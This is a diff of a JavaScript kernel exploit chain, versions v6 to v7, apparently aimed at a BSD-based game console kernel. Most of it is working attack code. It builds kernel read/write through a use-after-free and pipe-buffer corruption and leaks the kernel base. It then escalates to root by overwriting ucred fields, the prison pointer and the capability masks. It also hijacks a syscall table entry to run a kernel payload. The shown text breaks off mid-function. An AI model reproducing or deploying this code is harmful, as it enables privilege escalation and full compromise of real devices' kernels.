@@ -1,4 +1,4 @@
-// chain_poops_v6.js — fix O_NONBLOCK en socketpair para evitar deadlock en landUio
+// chain_poops_v7.js — retry de FDT-OFILES + debug de offset kq_fdp + sin cache
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -90,7 +90,7 @@ function check(name, ok, detail) {
     try {
         if (window.__TM) {
             window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
-            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v6.js', line: 0, col: 0, stack: '' });
+            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v7.js', line: 0, col: 0, stack: '' });
             if (window.__TM.render) window.__TM.render();
         }
     } catch (e) { }
@@ -121,7 +121,7 @@ const KQ_BATCH = 8;
 const KQ_HDR_MAGIC = 0x1430000;
 
 const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
-const NUM_UIO_SPRAY = 512;                    // *** reducido de 10000 a 512 ***
+const NUM_UIO_SPRAY = 512;
 const NUM_IOV_SPRAY_MAX = 100000;
 const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
 const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
@@ -393,7 +393,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
 
-        const scratchAb = new ArrayBuffer(0x2000); keepAlive.push(scratchAb);  // *** 0x1000 -> 0x2000 ***
+        const scratchAb = new ArrayBuffer(0x2000); keepAlive.push(scratchAb);
         const scratch = bufAddr(scratchAb);
         const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
         const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
@@ -462,8 +462,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
         const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
 
-        // *** FIX v6: O_NONBLOCK en ambos extremos del uio socketpair ***
-        // Esto evita deadlock cuando writev/read bloquean en landUio
         const uioNbioRc0 = sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK).i32;
         const uioNbioRc1 = sc(SYS.fcntl, uioSs[1], F_SETFL, O_NONBLOCK).i32;
         mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",")
@@ -747,7 +745,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
                 mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
                 committed = true;
-                mark("PRE-SENDMSG", "sendmsg=" + SYS.sendmsg + " dup=" + SYS.dup + " close=" + SYS.close + " uafSock=" + uafSock);
 
                 for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
 
@@ -878,6 +875,18 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     kernelBase = klLock.sub32(off.k_kl_lock);
                     mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                     mark("KERNEL-BASE", kernelBase + " = kl_lock-0x" + off.k_kl_lock.toString(16));
+
+                    // *** DEBUG: imprimir candidatos de offset para kq_fdp ***
+                    mark("KQUEUE-OFFSCAN", "probing offset candidates for kq_fdp");
+                    for (const probeOff of [0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0xb8, 0xc0]) {
+                        const lo = leakDv.getUint32(probeOff, true);
+                        const hi = leakDv.getUint32(probeOff + 4, true);
+                        const candidate = new int64(lo, hi);
+                        const isK = (hi >>> 0) >= 0xffff0000 && (lo & 7) === 0;
+                        mark("KQ-OFF-0x" + probeOff.toString(16),
+                            candidate + (isK ? "  [PLAUSIBLE KPTR]" : ""));
+                    }
+
                     check("kl_lock-kq_fdp-kernel-pointers", (klLock.hi >>> 0) === 0xffffffff && (kqFdp.hi >>> 0) >= 0xffff0000, "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
                     check("kernel-base-0x4000-aligned", (kernelBase.low & 0x3fff) === 0, "low=" + hx(kernelBase.low));
                     sc(SYS.close, kqFd);
@@ -910,8 +919,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets=" + triplets.join(",")); return null; }
             freeRthdr(triplets[2]);
             const uioDeadline = Date.now() + (params.has("uioms") ? parseInt(params.get("uioms"), 10) : 60000);
-
-            // *** FIX v6: cuántos bytes escribir/leer para vaciar el socketpair ***
             const wakeBytes = Math.min(size * NUM_UIO_IOV, 0x800);
 
             for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
@@ -921,7 +928,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 sc(SYS.sched_yield);
                 if (getRthdr(triplets[0], IOVEC_SIZE) >= 0 && leakDv.getInt32(8, true) === NUM_UIO_IOV)
                     return new int64(leakDv.getUint32(0, true), leakDv.getUint32(4, true));
-                // *** FIX v6: wake con wakeBytes (no size) ***
                 if (forWrite) {
                     for (let k = 0; k < uioWorkers.length; ++k)
                         sc(SYS.write, uioSs[1], scratch, wakeBytes);
@@ -930,7 +936,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                         sc(SYS.read, uioSs[0], scratch, wakeBytes);
                 }
                 try { await Promise.all(tasks); } catch (_) { }
-                // *** FIX v6: drain extra ***
                 if (!forWrite) sc(SYS.write, uioSs[1], scratch, wakeBytes);
                 if ((i & 0x1f) === 0x1f) await new Promise(r => setTimeout(r, 0));
             }
@@ -1083,307 +1088,322 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const R3_ON = params.get("r3") !== "0";
             const R4_ON = params.get("r4") !== "0";
 
-            const fdtOfiles = await kread8(kqFdp);
-            mark("FDT-OFILES", "" + fdtOfiles);
-
-            let mFp = null, sFp = null;
-            const fdDelta = slavePipe[0] - masterPipe[0];
-            const spanOk = R3_ON && fdtOfiles && fdDelta > 0 && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
-            if (spanOk) {
-                const span = await kreadN(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
-                if (span) { mFp = qw(span, 0); sFp = qw(span, fdDelta * FILEDESCENT_SIZE); }
-                else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
+            // *** FIX v7: retry de kread8(kqFdp) con validación ***
+            let fdtOfiles = null;
+            for (let t = 0; t < 8 && !fdtOfiles; ++t) {
+                if (t) mark("FDT-OFILES-RETRY", "try=" + (t + 1));
+                const v = await kread8(kqFdp);
+                if (v && kaddrOk(v)) {
+                    fdtOfiles = v;
+                } else {
+                    mark("FDT-OFILES-ZERO", "try=" + (t + 1) + " val=" + v);
+                    await new Promise(r => setTimeout(r, 100));
+                }
             }
-            if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
-                mFp = await kread8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
-                sFp = await kread8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
-            }
-            mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?") + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));
+            mark("FDT-OFILES", "" + (fdtOfiles || "FAILED-after-8-tries"));
 
-            let mData = null, sData = null;
-            if (R4_ON && mFp && sFp) {
-                const both = await kreadPairs([{ addr: mFp, size: 8 }, { addr: sFp, size: 8 }]);
-                if (both) { mData = qw(both, 0); sData = qw(both, 8); }
-            }
-            if (!mData && !kreadPoisoned && tripletsUsable()) {
-                mData = mFp ? await kread8(mFp) : null;
-                sData = sFp ? await kread8(sFp) : null;
-            }
-            mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
+            if (!fdtOfiles) {
+                mark("MAKE-KARW-ABORTED", "reason=fdt-ofiles-zero");
+            } else {
+                let mFp = null, sFp = null;
+                const fdDelta = slavePipe[0] - masterPipe[0];
+                const spanOk = R3_ON && fdtOfiles && fdDelta > 0 && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
+                if (spanOk) {
+                    const span = await kreadN(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
+                    if (span) { mFp = qw(span, 0); sFp = qw(span, fdDelta * FILEDESCENT_SIZE); }
+                    else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
+                }
+                if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
+                    mFp = await kread8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
+                    sFp = await kread8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
+                }
+                mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?") + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));
 
-            const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
-            if (kptr(mData) && kptr(sData) && mData.low === sData.low && mData.hi === sData.hi) {
-                check("pipe-fdata-distinct", false, "both=" + mData);
-                mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
-                mData = null;
-            }
-            if (check("ofiles-walk-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
-                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF); keepAlive.push(pbAb);
-                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
-                new Uint8Array(pbAb).fill(0);
-                pbDv.setUint32(0x0c, PIPE_PAGE, true);
-                put(pbDv, 0x10, sData);
-                mark("PIPEBUF-AIM", "at=" + mData + " size=0x" + PIPE_PAGE.toString(16) + " buffer=" + sData);
-                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
-                check("pipebuf-written-master-struct-pipe", wrote, "");
+                let mData = null, sData = null;
+                if (R4_ON && mFp && sFp) {
+                    const both = await kreadPairs([{ addr: mFp, size: 8 }, { addr: sFp, size: 8 }]);
+                    if (both) { mData = qw(both, 0); sData = qw(both, 8); }
+                }
+                if (!mData && !kreadPoisoned && tripletsUsable()) {
+                    mData = mFp ? await kread8(mFp) : null;
+                    sData = sFp ? await kread8(sFp) : null;
+                }
+                mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
 
-                if (wrote) {
-                    for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
-                    const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
-                    const kvViewAb = new ArrayBuffer(0x40);
-                    keepAlive.push(kvBufAb, kvViewAb);
-                    const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
-                    const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
-                    new Uint8Array(kvBufAb).fill(0); kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
-                    kv = {
-                        flush: function () {
-                            sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
-                            sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
-                        },
-                        kread: function (dst, src, n) {
-                            put(kvBufDv, 0x10, src); kvBufDv.setUint32(0, n >>> 0, true);
-                            this.flush();
-                            return sc(SYS.read, slavePipe[0], dst, n).i32;
-                        },
-                        kwrite: function (dst, src, n) {
-                            put(kvBufDv, 0x10, dst); kvBufDv.setUint32(0, n >>> 0, true);
-                            this.flush();
-                            return sc(SYS.write, slavePipe[1], src, n).i32;
-                        },
-                        read8: function (a) {
-                            new Uint8Array(kvViewAb).fill(0);
-                            this.kread(kvViewAddr, a, 8);
-                            return new int64(kvViewDv.getUint32(0, true), kvViewDv.getUint32(4, true));
-                        },
-                    };
-                    mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);
+                const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
+                if (kptr(mData) && kptr(sData) && mData.low === sData.low && mData.hi === sData.hi) {
+                    check("pipe-fdata-distinct", false, "both=" + mData);
+                    mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
+                    mData = null;
+                }
+                if (check("ofiles-walk-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
+                    const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF); keepAlive.push(pbAb);
+                    const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
+                    new Uint8Array(pbAb).fill(0);
+                    pbDv.setUint32(0x0c, PIPE_PAGE, true);
+                    put(pbDv, 0x10, sData);
+                    mark("PIPEBUF-AIM", "at=" + mData + " size=0x" + PIPE_PAGE.toString(16) + " buffer=" + sData);
+                    const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
+                    check("pipebuf-written-master-struct-pipe", wrote, "");
 
-                    new Uint8Array(kvViewAb).fill(0);
-                    kv.kread(kvViewAddr, kernelBase, 0x10);
-                    const hdr = [];
-                    for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
-                    mark("KV-READ", "kernel_base -> " + hdr.map(v => v.toString(16).padStart(2, "0")).join(" "));
-                    const kvElfOk = check("kernelview-reads-kernel-elf-header", kvViewDv.getUint32(0, true) === 0x464c457f, "");
-
-                    const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
-                    const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
-                    function kview(base) {
-                        return {
-                            getBInt: o => kv.read8(base.add32(o)),
-                            setBInt: function (o, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(base.add32(o), kvwAddr, 8); },
-                            getInt32: function (o) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, base.add32(o), 4); return kvwDv.getInt32(0, true); },
-                            setInt32: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setInt32(0, v, true); kv.kwrite(base.add32(o), kvwAddr, 4); },
-                            setUint8: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setUint8(0, v); kv.kwrite(base.add32(o), kvwAddr, 1); },
+                    if (wrote) {
+                        for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
+                        const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
+                        const kvViewAb = new ArrayBuffer(0x40);
+                        keepAlive.push(kvBufAb, kvViewAb);
+                        const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
+                        const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
+                        new Uint8Array(kvBufAb).fill(0); kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
+                        kv = {
+                            flush: function () {
+                                sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
+                                sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
+                            },
+                            kread: function (dst, src, n) {
+                                put(kvBufDv, 0x10, src); kvBufDv.setUint32(0, n >>> 0, true);
+                                this.flush();
+                                return sc(SYS.read, slavePipe[0], dst, n).i32;
+                            },
+                            kwrite: function (dst, src, n) {
+                                put(kvBufDv, 0x10, dst); kvBufDv.setUint32(0, n >>> 0, true);
+                                this.flush();
+                                return sc(SYS.write, slavePipe[1], src, n).i32;
+                            },
+                            read8: function (a) {
+                                new Uint8Array(kvViewAb).fill(0);
+                                this.kread(kvViewAddr, a, 8);
+                                return new int64(kvViewDv.getUint32(0, true), kvViewDv.getUint32(4, true));
+                            },
                         };
-                    }
-                    const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
-                    const fget = fd => kv.read8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
-                    function fput(fd, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8); }
-                    function fhold(fp) {
-                        const before = kview(fp).getInt32(0x28);
-                        if (before <= 0 || before > 0xffff) return { before, after: before };
-                        let after = before;
-                        for (let bump = 1; bump <= 4; ++bump) { kview(fp).setInt32(0x28, before + bump); after = kview(fp).getInt32(0x28); if (after > before && after >= 2) break; }
-                        return { before, after };
-                    }
-                    {
-                        const held = []; let allOk = true;
-                        for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) {
-                            const fp = fget(fd);
-                            if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
-                            const r = fhold(fp);
-                            if (!(r.after > r.before)) allOk = false;
-                            held.push(fd + ":" + r.before + "->" + r.after);
-                        }
-                        mark("PIPE-REFCNT", held.join(" "));
-                        check("four-karw-pipe-files-hold", allOk, "");
-                    }
+                        mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);
 
-                    // Jailbreak
-                    let jailbroken = false, curproc = null;
-                    if (CFG_DO_JAILBREAK === 1) try {
-                        const FIOSETOWN = 0x8004667c;
-                        const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
-                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
-                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
-                        const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
-                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
-                        state("sandbox escape...", "warn");
+                        new Uint8Array(kvViewAb).fill(0);
+                        kv.kread(kvViewAddr, kernelBase, 0x10);
+                        const hdr = [];
+                        for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
+                        mark("KV-READ", "kernel_base -> " + hdr.map(v => v.toString(16).padStart(2, "0")).join(" "));
+                        const kvElfOk = check("kernelview-reads-kernel-elf-header", kvViewDv.getUint32(0, true) === 0x464c457f, "");
+
+                        const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
+                        const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
+                        function kview(base) {
+                            return {
+                                getBInt: o => kv.read8(base.add32(o)),
+                                setBInt: function (o, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(base.add32(o), kvwAddr, 8); },
+                                getInt32: function (o) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, base.add32(o), 4); return kvwDv.getInt32(0, true); },
+                                setInt32: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setInt32(0, v, true); kv.kwrite(base.add32(o), kvwAddr, 4); },
+                                setUint8: function (o, v) { new Uint8Array(kvwAb).fill(0); kvwDv.setUint8(0, v); kv.kwrite(base.add32(o), kvwAddr, 1); },
+                            };
+                        }
+                        const kptr2 = v => v && (v.hi >>> 0) >= 0xffff0000;
+                        const fget = fd => kv.read8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
+                        function fput(fd, v) { new Uint8Array(kvwAb).fill(0); put(kvwDv, 0, v); kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8); }
+                        function fhold(fp) {
+                            const before = kview(fp).getInt32(0x28);
+                            if (before <= 0 || before > 0xffff) return { before, after: before };
+                            let after = before;
+                            for (let bump = 1; bump <= 4; ++bump) { kview(fp).setInt32(0x28, before + bump); after = kview(fp).getInt32(0x28); if (after > before && after >= 2) break; }
+                            return { before, after };
+                        }
                         {
-                            if (sc(SYS.pipe, argAddr).i32 !== -1) {
-                                const escPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-                                lenDv.setUint32(0, pid, true);
-                                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
-                                const escFp = fget(escPipe[0]);
-                                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
-                                const sigio = kptr2(escData) ? kv.read8(escData.add32(0xd0)) : null;
-                                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
-                                sc(SYS.close, escPipe[1]); sc(SYS.close, escPipe[0]);
+                            const held = []; let allOk = true;
+                            for (const fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) {
+                                const fp = fget(fd);
+                                if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
+                                const r = fhold(fp);
+                                if (!(r.after > r.before)) allOk = false;
+                                held.push(fd + ":" + r.before + "->" + r.after);
                             }
-                            check("curproc-resolved-through-pipe-sigio", kptr2(curproc), "" + (curproc || "null"));
+                            mark("PIPE-REFCNT", held.join(" "));
+                            check("four-karw-pipe-files-hold", allOk, "");
                         }
-                        if (kptr2(curproc)) {
-                            function pfind(target) {
-                                let q = kv.read8(curproc);
-                                for (let n = 0; n < 4096; ++n) { if (!kptr2(q)) return null; if (kview(q).getInt32(P_PID) === target) return q; q = kv.read8(q.add32(P_LIST_NEXT)); }
-                                return null;
-                            }
-                            const kProc = pfind(0);
-                            const procFd = kv.read8(curproc.add32(P_FD));
-                            const ucred = kv.read8(curproc.add32(P_UCRED));
-                            const prison0 = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON)) : null;
-                            const rootVnode = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR)) : null;
-                            const srcOk = kptr2(procFd) && kptr2(ucred) && kptr2(prison0) && kptr2(rootVnode);
-                            if (check("jailbreak-source-kernel-pointer", srcOk, srcOk ? "" : "refusing to write")) {
-                                kview(ucred).setInt32(CR_UID, 0);
-                                kview(ucred).setInt32(CR_RUID, 0);
-                                kview(ucred).setInt32(CR_SVUID, 0);
-                                kview(ucred).setInt32(CR_NGROUPS, 1);
-                                kview(ucred).setInt32(CR_RGID, 0);
-                                kview(ucred).setBInt(CR_PRISON, prison0);
-                                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
-                                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
-                                kview(procFd).setBInt(FD_RDIR, rootVnode);
-                                kview(procFd).setBInt(FD_JDIR, rootVnode);
-                                const uidNow = sc(SYS.getuid).i32;
-                                jailbroken = uidNow === 0;
-                                mark("JAILBROKEN", "uid=" + uidNow);
-                                check("kernel-reports-root", jailbroken, "getuid=" + uidNow);
-                            }
-                        }
-                    } catch (jbe) { mark("JAILBREAK-THREW", jbe.message || String(jbe)); }
 
-                    // KPATCH
-                    let kpatched = false;
-                    if (CFG_DO_KPATCH === 1 && jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) try {
-                        state("kernel patches...", "warn");
-                        const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
-                        const sysent = kernelBase.add32(off.k_sysent_661);
-                        const gadget = kernelBase.add32(off.k_jmp_rsi);
-                        const gb = [];
-                        for (let i = 0; i < 4; ++i) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, gadget.add32(i), 1); gb.push(kvwDv.getUint8(0)); }
-                        mark("JMP-RSI-BYTES", gadget + " -> " + gb.map(v => v.toString(16).padStart(2, "0")).join(" "));
-                        const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
-                        const oNarg = kview(sysent).getInt32(SYSENT_NARG);
-                        const oCall = kview(sysent).getBInt(SYSENT_CALL);
-                        const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
-                        const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);
-                        const siteBytes = []; let sitesOk = true;
-                        for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); const b = kvwDv.getUint8(0); siteBytes.push(hx(s) + ":" + b.toString(16)); if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false; }
-                        check("gadget-sysent661-patch-sites-look-right", gadgetOk && sysentOk && sitesOk, "gadget=" + gadgetOk + " sysent=" + sysentOk + " sites=" + sitesOk);
-                        if (gadgetOk && sysentOk && sitesOk) {
-                            const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
-                            const KEXEC_MAP = new int64(0x20100000, 9);
-                            const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
-                            const mapAddr = new int64(mapped.lo, mapped.hi);
-                            if (mapAddr.hi > 0) {
-                                for (let i = 0; i < kpatch.length; ++i) p.write1(mapAddr.add32(i), kpatch[i]);
-                                let copied = true;
-                                for (let i = 0; i < kpatch.length; ++i) if (p.read1(mapAddr.add32(i)) !== kpatch[i]) { copied = false; break; }
-                                check("blob-rwx-memory-byte-byte", copied, kpatch.length + " bytes");
-                                if (copied) {
-                                    kview(sysent).setInt32(SYSENT_NARG, 2);
-                                    kview(sysent).setBInt(SYSENT_CALL, gadget);
-                                    kview(sysent).setInt32(SYSENT_THRCNT, 1);
-                                    const armedOk = kview(sysent).getBInt(SYSENT_CALL).low === gadget.low;
-                                    if (armedOk) {
-                                        let rc = -1;
-                                        try { rc = sc(SYS.kexec, mapAddr).i32; }
-                                        finally {
-                                            kview(sysent).setInt32(SYSENT_NARG, oNarg);
-                                            kview(sysent).setBInt(SYSENT_CALL, oCall);
-                                            kview(sysent).setInt32(SYSENT_THRCNT, oThr);
+                        // Jailbreak
+                        let jailbroken = false, curproc = null;
+                        if (CFG_DO_JAILBREAK === 1) try {
+                            const FIOSETOWN = 0x8004667c;
+                            const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
+                            const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
+                            const CR_NGROUPS = 0x10, CR_RGID = 0x14;
+                            const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
+                            const FD_RDIR = 0x10, FD_JDIR = 0x18;
+                            state("sandbox escape...", "warn");
+                            {
+                                if (sc(SYS.pipe, argAddr).i32 !== -1) {
+                                    const escPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+                                    lenDv.setUint32(0, pid, true);
+                                    sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
+                                    const escFp = fget(escPipe[0]);
+                                    const escData = kptr2(escFp) ? kv.read8(escFp) : null;
+                                    const sigio = kptr2(escData) ? kv.read8(escData.add32(0xd0)) : null;
+                                    curproc = kptr2(sigio) ? kv.read8(sigio) : null;
+                                    sc(SYS.close, escPipe[1]); sc(SYS.close, escPipe[0]);
+                                }
+                                check("curproc-resolved-through-pipe-sigio", kptr2(curproc), "" + (curproc || "null"));
+                            }
+                            if (kptr2(curproc)) {
+                                function pfind(target) {
+                                    let q = kv.read8(curproc);
+                                    for (let n = 0; n < 4096; ++n) { if (!kptr2(q)) return null; if (kview(q).getInt32(P_PID) === target) return q; q = kv.read8(q.add32(P_LIST_NEXT)); }
+                                    return null;
+                                }
+                                const kProc = pfind(0);
+                                const procFd = kv.read8(curproc.add32(P_FD));
+                                const ucred = kv.read8(curproc.add32(P_UCRED));
+                                const prison0 = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON)) : null;
+                                const rootVnode = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR)) : null;
+                                const srcOk = kptr2(procFd) && kptr2(ucred) && kptr2(prison0) && kptr2(rootVnode);
+                                if (check("jailbreak-source-kernel-pointer", srcOk, srcOk ? "" : "refusing to write")) {
+                                    kview(ucred).setInt32(CR_UID, 0);
+                                    kview(ucred).setInt32(CR_RUID, 0);
+                                    kview(ucred).setInt32(CR_SVUID, 0);
+                                    kview(ucred).setInt32(CR_NGROUPS, 1);
+                                    kview(ucred).setInt32(CR_RGID, 0);
+                                    kview(ucred).setBInt(CR_PRISON, prison0);
+                                    kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
+                                    kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
+                                    kview(procFd).setBInt(FD_RDIR, rootVnode);
+                                    kview(procFd).setBInt(FD_JDIR, rootVnode);
+                                    const uidNow = sc(SYS.getuid).i32;
+                                    jailbroken = uidNow === 0;
+                                    mark("JAILBROKEN", "uid=" + uidNow);
+                                    check("kernel-reports-root", jailbroken, "getuid=" + uidNow);
+                                }
+                            }
+                        } catch (jbe) { mark("JAILBREAK-THREW", jbe.message || String(jbe)); }
+
+                        // KPATCH
+                        let kpatched = false;
+                        if (CFG_DO_KPATCH === 1 && jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) try {
+                            state("kernel patches...", "warn");
+                            const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
+                            const sysent = kernelBase.add32(off.k_sysent_661);
+                            const gadget = kernelBase.add32(off.k_jmp_rsi);
+                            const gb = [];
+                            for (let i = 0; i < 4; ++i) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, gadget.add32(i), 1); gb.push(kvwDv.getUint8(0)); }
